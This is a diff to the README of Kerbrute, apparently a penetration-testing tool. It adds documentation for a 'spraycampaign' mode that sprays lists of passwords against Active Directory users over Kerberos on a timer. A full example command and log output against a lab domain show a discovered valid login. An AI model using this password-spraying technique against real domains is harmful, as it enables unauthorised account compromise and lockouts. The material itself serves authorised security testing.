@@ -116,6 +116,35 @@ Version: dev (43f9ca1) - 03/06/19 - Ronnie Flathers @ropnop
 2019/03/06 21:37:37 >  Done! Tested 2755 logins (2 successes) in 7.674 seconds
 ```
 
+### Spray Campaign  
+With `spraycampaign`, Kerbrute will perform an attack similar to the
+`passwordspray` command, however a list of passwords can be provided. A specified
+number of passwords from the provided list will be sprayed against all users
+in the provided user wordlist every X minutes, as specified.  
+Added by [@deadjakk](https://github.com/deadjakk)
+```
+root@kali:~# ./kerbrute spraycampaign -d sprawl.local users.txt pass.txt 1 2
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: dev (n/a) - 05/31/21 - Ronnie Flathers @ropnop
+
+2021/05/31 14:48:21 >  Using KDC(s):
+2021/05/31 14:48:21 >  	DC0.sprawl.local:88
+
+2021/05/31 14:48:21 >  Spraying password: Password3
+2021/05/31 14:48:21 >  Spraying password: Password2
+2021/05/31 14:48:21 >  Sleeping for 1 minutes until next sweep
+
+2021/05/31 14:49:21 >  Spraying password: Password1
+2021/05/31 14:49:21 >  [+] VALID LOGIN:	 user1@sprawl.local:Password1
+2021/05/31 14:49:21 >  Done! Tested 12 logins (1 successes) in 60.073 seconds
+```
+
 ### Brute User
 This is a traditional bruteforce account against a username. Only run this if you are sure there is no lockout policy! This will generate both event IDs [4768 - A Kerberos authentication ticket (TGT) was requested](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) and [4771 - Kerberos pre-authentication failed](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771)
 
